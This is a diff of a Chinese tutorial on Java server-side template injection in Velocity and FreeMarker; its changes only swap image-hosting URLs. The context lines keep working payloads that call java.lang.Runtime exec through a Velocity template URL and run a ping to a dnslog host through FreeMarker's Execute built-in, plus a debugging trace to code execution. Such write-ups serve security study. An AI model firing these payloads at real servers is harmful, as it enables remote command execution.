@@ -525,7 +525,7 @@ java.lang包是java语言的核心，它提供了java中的基础类。包括基
 
 **如下图所示：**
 
-[![此处输入图片的描述](https://gitee.com/Cralwer/typora-pic/raw/master/images/java.lang.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png)此处输入图片的描述
+[![此处输入图片的描述](https://img.dem0dem0.top/images/java.lang.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png)此处输入图片的描述
 
 有了这个基础我们就能想到这样的payload
 
@@ -666,11 +666,11 @@ java.lang.UNIXProcess@12f40c25
 
 通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200907173719066-1030164230.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200907173719066-1030164230.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png)
 
 这里使用java-sec-code里面的SSTI代码：
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200907191011269-128540012.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200907191011269-128540012.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png)
 
 poc：
 
@@ -680,7 +680,7 @@ poc：
 http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒
 ```
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200907192034956-1485346370.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200907192034956-1485346370.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png)
 
 参照《[白头搔更短，SSTI惹人心！](https://xz.aliyun.com/t/7466)》简单进行调试
 
@@ -690,34 +690,34 @@ http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass(
 
 （template -> instring）进入 Velocity.evaluate 方法：
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908112550988-1581803954.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908112550988-1581803954.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png)
 
 （instring -> reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908112728222-13161049.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908112728222-13161049.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png)
 
 跟进 StringReader 方法查看详情：
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908113941507-617770245.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908113941507-617770245.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png)
 
 （reader -> nodeTree）继续跟进 this.evaluate() 方法
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908115525966-63941808.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908115525966-63941808.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png)
 
 （nodeTree -> writer）继续跟进render方法
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908141827072-400777989.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908141827072-400777989.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png)
 
 emmm...继续跟进render
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908142340601-1472158535.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908142340601-1472158535.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png)
 
 继续看render方法
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908143916739-984676483.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908143916739-984676483.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png)
 
 跟进execute方法
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200908144606960-964942274.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200908144606960-964942274.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png)
 
 可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE
 
@@ -733,7 +733,7 @@ emmm...继续跟进render
 
 FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200909230452926-1382441572.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200909230452926-1382441572.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png)
 
 **FreeMarker模板代码**：
 
@@ -758,7 +758,7 @@ FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据，
 
 具体的高级内置函数定义参考《[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)》
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200911000148374-491461162.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200911000148374-491461162.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png)
 
 主要的用法如下：
 
@@ -905,7 +905,7 @@ public class HelloController {
 
 上述代码主要编译给定的模板字符串和数据，生成HTML进行输出
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200911153736602-1300404619.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200911153736602-1300404619.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png)
 
 模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。
 
@@ -917,15 +917,15 @@ public class HelloController {
 {"hello.ftl": "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"ping ilxwh0.dnslog.cn\") }<title>Hello!</title><link href=\"/css/main.css\" rel=\"stylesheet\"></head><body><h2 class=\"hello-title\">Hello!</h2><script src=\"/js/main.js\"></script></body></html>"}
 ```
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200911170426315-957198191.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200911170426315-957198191.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png)
 
 关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200911171827668-2059326925.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200911171827668-2059326925.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png)
 
 重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令
 
-[![img](https://gitee.com/Cralwer/typora-pic/raw/master/images/1344396-20200911173804255-14835990.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png)
+[![img](https://img.dem0dem0.top/images/1344396-20200911173804255-14835990.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png)
 
 dnslog平台也受到了请求
 
@@ -933,7 +933,7 @@ dnslog平台也受到了请求
 
 ## 二、开始运用
 
-![](https://gitee.com/Cralwer/typora-pic/raw/master/images/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png)
+![](https://img.dem0dem0.top/images/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png)
 
 这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结
 
